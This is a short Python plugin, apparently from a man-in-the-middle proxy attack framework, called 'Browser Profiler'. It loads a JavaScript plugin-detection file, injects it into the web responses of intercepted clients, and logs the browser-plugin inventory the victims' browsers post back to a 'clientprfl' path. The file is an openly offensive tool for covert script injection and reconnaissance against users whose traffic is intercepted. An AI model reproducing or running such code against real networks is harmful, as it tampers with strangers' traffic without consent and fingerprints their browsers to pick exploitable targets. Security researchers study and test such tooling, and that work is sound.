import json
from plugins.plugin import Plugin
from plugins.inject import Inject
from pprint import pformat

class BrowserProfiler(Plugin):
    name = 'Browser Profiler'
    optname = 'browserprofiler'
    desc = 'Attempts to enumerate all browser plugins of connected clients'
    ver = '0.3'

    def initialize(self, context):
        context.js_file = open('plugins/resources/plugindetect.js', 'r')

    def request(self, context, flow):
        if flow.request.method == 'POST' and ('clientprfl' in flow.request.path):
            context.handle_post_output = True
            pretty_output = pformat(json.loads(flow.request.content))
            context.log("[BrowserProfiler] Got data:\n{}".format(pretty_output))

    def response(self, context, flow):
        Inject().response(context, flow)